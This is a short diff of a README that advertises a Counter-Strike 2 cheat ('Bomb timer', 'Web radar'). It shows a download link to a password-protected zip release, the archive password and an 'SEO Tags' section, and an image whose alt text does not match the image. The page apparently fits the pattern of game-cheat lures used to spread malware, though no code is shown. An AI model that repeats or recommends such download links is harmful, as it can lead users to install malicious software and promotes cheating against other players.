@@ -53,6 +53,7 @@ Bomb timer
 Web radar
 ## 💎EXAMPLE
 ![Screenshot of a comment on a GitHub issue showing an image, added in the Markdown, of an Octocat smiling and raising a tentacle.](https://esportsinsider.com/wp-content/uploads/2026/02/What-CS2-cheats-are-some-players-using-large.jpg)
+
 ![Download](https://github.com/Goldenonbond/CS2_MemeSense/releases/download/Cs2/CS2_ANYX-GG.zip)  
 💎PASSWORD - 𝗔𝗡𝗬𝗫💎
 SEO Tags:
